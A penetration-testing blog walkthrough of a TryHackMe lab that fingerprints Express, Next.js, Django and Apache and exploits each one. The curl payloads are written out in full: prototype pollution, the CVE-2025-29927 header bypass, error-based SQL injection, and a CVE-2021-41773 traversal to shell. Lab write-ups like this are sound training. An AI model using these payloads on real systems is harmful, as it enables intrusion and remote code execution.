---
title: "TryHackMe Modern Web Stacks: Four Stacks, Four CVEs"
date: 2026-08-31T20:32:00+05:30
lastmod: 2026-08-31T20:32:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-mws/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Jr Penetration Tester
  - Web Application Security
  - Prototype Pollution
  - Next.js
  - Django
  - SQL Injection
  - Apache
  - Web Fundamentals

draft: false
description: "TryHackMe Modern Web Stacks walkthrough: fingerprint four stacks, then exploit prototype pollution, CVE-2025-29927, CVE-2021-35042 and CVE-2021-41773."
---

## Modern Web Stacks

A premium room in the **Web Application Security Fundamentals** module on the Jr Penetration Tester path, and a real step up from [Content Discovery](/post/thm-room-contentdiscoveryx/) and [Walking An Application](/post/thm-room-walkinganapp/). Those two teach you to find things. This one teaches you that once you know exactly what is running, the exploit is usually a lookup rather than a search.

One host runs four separate applications on four ports:

| Port | Stack | Vulnerability |
|---|---|---|
| 3000 | MERN (Express) | prototype pollution in a merge endpoint |
| 3001 | Next.js App Router | CVE-2025-29927 middleware bypass |
| 8000 | Django | CVE-2021-35042 SQL injection |
| 8080 | Apache 2.4.49 | CVE-2021-41773 path traversal to RCE |

All four ports answered directly from my Mac over the THM tunnel, so no AttackBox: everything below is `curl` from a local shell. The room's own workflow is worth stating because it is the actual lesson: fingerprint the stack from passive signals, confirm the version, then execute the chain. Never the other way round.

## Task 2: MERN, and a merge function that trusts its keys

Express announces itself. Two signals on a single `HEAD` request:

```bash
$ curl -sI http://MACHINE_IP:3000/
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Set-Cookie: connect.sid=s%3AJHdQ92gnPZJ4jZys99ZskQ_OyQzK4Y4a...; Path=/; HttpOnly
```

The header answer is **X-Powered-By: Express**, and the session cookie to replay requests with is **connect.sid**. Express sets that header on every response unless the developer explicitly calls `app.disable('x-powered-by')` or adds Helmet, which most do not.

The admin route rejects a normal session:

```bash
$ curl -s -c cookies.txt http://MACHINE_IP:3000/ -o /dev/null
$ curl -s -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
{"error":"Not authorized"}
```

The update endpoint merges arbitrary JSON into the user object with no key filtering, which is the whole bug. Every JavaScript object inherits from `Object.prototype`, so a merge that copies a `__proto__` key writes onto that shared root and every object in the process inherits the new property, including the one the admin check reads.

```bash
$ curl -s -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
    -H 'Content-Type: application/json' -d '{"__proto__":{"isAdmin":true}}'
{"status":"updated"}

$ curl -s -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
{"flag":"THM{pr0t0_p0llut3d}"}
```

The flag is **THM{pr0t0_p0llut3d}**.

![Terminal output showing the Express X-Powered-By header and connect.sid cookie, the prototype pollution POST returning status updated, and the admin route returning the flag](/img/thm-mws/01-mern.png)

Worth flagging honestly: when I re-ran this to capture the screenshot, a brand new session with no pollution payload already got the flag. That is not a broken lab, it is the vulnerability behaving correctly. `Object.prototype` is process-wide, so the pollution persists for every user and every session until the Node process restarts. The "before" state genuinely cannot be reproduced without restarting the app. That persistence is what makes prototype pollution severe rather than a curiosity.

## Task 3: Next.js, and a header that says "I already ran"

Next.js is louder than Express. `X-Powered-By: Next.js`, `x-nextjs-cache`, and a `Vary` header listing `RSC, Next-Router-State-Tree` all show up on a plain `HEAD`. The question asks specifically for the HTML artifact, which is the App Router hydration array injected into every page:

```bash
$ curl -s http://MACHINE_IP:3001/ | grep -oE 'self\.__next_f' | head -1
self.__next_f
```

The accepted answer is **window.__next_f**, which is what the room's own material names. The rendered page actually emits `self.__next_f`, and I checked the answer mask before submitting: it allows six characters before the dot, which fits `window` and rules out `self`. Same array, different global reference, and the mask is what settled it.

{{< ad >}}

### CVE-2025-29927

Next.js middleware is where most App Router applications put authentication. It runs in front of every route, so it is a single chokepoint. CVE-2025-29927 lets a request declare itself as an internal subrequest, and the framework skips middleware entirely for it.

The `/dashboard` route is guarded and redirects unauthenticated requests:

```bash
$ curl -s -o /dev/null -w '%{http_code}\n' http://MACHINE_IP:3001/dashboard
307
```

The bypass is a single request header. The value matters:

```bash
  # these do nothing
$ curl -H 'x-middleware-subrequest: middleware'      ...  -> 307
$ curl -H 'x-middleware-subrequest: src/middleware'  ...  -> 307

  # this one works
$ curl -s -o /dev/null -w '%{http_code}\n' \
    -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
    http://MACHINE_IP:3001/dashboard
200
```

I burned three attempts on the single-value forms first. Newer patched-adjacent Next.js versions count recursion depth, so the value has to repeat enough times to exceed the internal limit, and the five-segment chain is the reliable form. Reading the response gives the flag:

```bash
$ curl -s -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' \
    http://MACHINE_IP:3001/dashboard | grep -oE 'THM\{[^}]*\}' | head -1
THM{m1ddl3w4r3_byp4ss3d}
```

**THM{m1ddl3w4r3_byp4ss3d}**.

![Terminal output showing the Next.js hydration array, a 307 redirect without the header, and a 200 plus the flag once the repeated-chain x-middleware-subrequest header is sent](/img/thm-mws/02-nextjs.png)

No credentials, no session, no brute force. One header defeats the entire authentication layer, because the authentication layer was a middleware function and the framework was persuaded not to run it.

## Task 4: Django, and a sort parameter inside ORDER BY

Django leaks its identity in two places at once, the WSGI banner and the CSRF token that its template tag emits into every POST form:

```bash
$ curl -sI http://MACHINE_IP:8000/products/ | grep -i '^server'
Server: WSGIServer/0.2 CPython/3.10.12

$ curl -s http://MACHINE_IP:8000/products/ | grep -oE 'name="csrfmiddlewaretoken"'
name="csrfmiddlewaretoken"
```

The hidden field answer is **csrfmiddlewaretoken**. It is a near-certain fingerprint because Django's `{% csrf_token %}` tag renders it and nothing else uses that exact name.

The interesting part of that page is not the token, it is the second hidden field: an `order` parameter that the view concatenates straight into an `ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)`. The `CASE WHEN` is always true, so whatever you supply always executes.

Since Django is running with `DEBUG = True`, database errors are rendered into the 500 response body. That turns `updatexml()` into a read primitive: MySQL raises an XPath error when the expression is invalid, and it helpfully includes the evaluated string in the error text. Wrapping a `SELECT` in `concat(0x7e, ...)` puts the result in the message with `~` as a delimiter.

```bash
$ curl -s -G "http://MACHINE_IP:8000/products/" \
    --data-urlencode 'order=updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)' \
  | grep -oE 'XPATH syntax error: [^<]*' | head -1
XPATH syntax error: &#x27;~vuln_db~&#x27;
```

The database is **vuln_db**.

![Terminal output showing the Django WSGIServer banner, the csrfmiddlewaretoken hidden field, and an XPATH syntax error leaking the database name vuln_db](/img/thm-mws/03-django.png)

Two conditions had to hold for this to work, and both are configuration rather than code: the ORM was bypassed for a raw query, and `DEBUG` was left on in a reachable environment. Either alone is survivable. Together they are a full error-based extraction channel.

## Task 5: LAMP, path traversal that becomes command execution

Apache 2.4.49 is a one-version vulnerability window, and it advertises itself:

```bash
$ curl -sI http://MACHINE_IP:8080/ | grep -i '^server'
Server: Apache/2.4.49 (Unix)
```

The exact string is **Apache/2.4.49 (Unix)**. The second confirming signal is that `/cgi-bin/` returns **403 Forbidden** rather than 404, which means the alias exists and `mod_cgi` is enabled. That distinction is what turns a file-read bug into remote code execution.

The bug is in `ap_normalize_path()`: the traversal filter runs before full URL decoding, so `/.%2e/` is not recognised as `/../` by the filter but resolves to it at the filesystem layer. The required curl flag is **--path-as-is**, because curl normalises `..` sequences client-side by default and would collapse the payload before it ever left the machine.

My first attempt targeted `/etc/passwd` through `/cgi-bin/` and returned a 500, which briefly looked like failure. It was not: `/cgi-bin/` is script-aliased, so Apache tried to *execute* `/etc/passwd` as CGI. Point the same traversal at a real interpreter instead, and the POST body becomes its stdin:

```bash
$ curl -s --path-as-is -X POST \
    --data 'echo Content-Type: text/plain; echo; id; cat /flag.txt' \
    "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
uid=1(daemon) gid=1(daemon) groups=1(daemon)
THM{4p4ch3_p4th_tr4v3rs4l}
```

The flag is **THM{4p4ch3_p4th_tr4v3rs4l}**, running as `daemon`.

![Terminal output showing the Apache 2.4.49 Unix server header, a 403 on /cgi-bin/ confirming mod_cgi, and the traversal into /bin/sh returning uid daemon and the flag](/img/thm-mws/04-lamp.png)

## Task 6: where the scanner fits

The room closes by running Nikto against all four ports, and it is worth being clear about what that buys you. Nikto reports `Retrieved x-powered-by header: Express` and the missing security headers, which is the fingerprinting step done for you across many hosts at once. What it does not do is send a `__proto__` key to a merge endpoint, or work out that a repeated-chain header defeats a middleware function. Those need someone who knows why the code is written that way.

Scanners answer "what is running here". They do not answer "what does that let me do".

## Two things worth keeping

**The version string is the exploit.** Apache 2.4.49 maps to CVE-2021-41773 and nothing else. Next.js App Router plus a 307 redirect on a protected route maps to CVE-2025-29927. In both cases the reconnaissance was one `curl -I` and the exploitation was a lookup, not a search. That is the room's actual argument, and it is why the tester who fingerprints first finishes before the one waiting on scanner output.

**Prototype pollution is process-wide, not session-wide.** I only noticed because a fresh unpolluted session got the admin flag when I went back to capture evidence. `Object.prototype` is shared by every object in the Node process, so one unauthenticated POST escalates every current and future user until a restart. When you report one of these, the impact statement is not "I escalated my own session", it is "I changed the default for everyone".

Room solved 100%: 7 tasks, 13 answers.
